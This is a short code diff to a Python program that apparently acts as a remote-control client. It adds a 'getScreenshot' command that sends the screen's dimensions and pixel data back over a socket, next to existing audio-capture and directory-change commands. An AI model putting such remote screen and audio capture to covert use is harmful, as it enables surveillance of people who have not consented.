@@ -270,6 +270,12 @@ class ChildSocket(threading.Thread):
                     except:
                         pass
                     stdoutput = 'audioStopped'
+                elif data.startswith('getScreenshot'):
+                    stdoutput = str({
+                        'width': width,
+                        'height': height,
+                        'screenshotbits': screen_bits()
+                    })
                 elif data.startswith("cd"):
                     try:
                         os.chdir(data[3:])
@@ -301,7 +307,6 @@ class ChildSocket(threading.Thread):
                 send(self.socket, stdoutput, mode)
             except socket.error:
                 return
-
 
 class AudioStreaming(threading.Thread):
     def __init__(self, sock, rate):
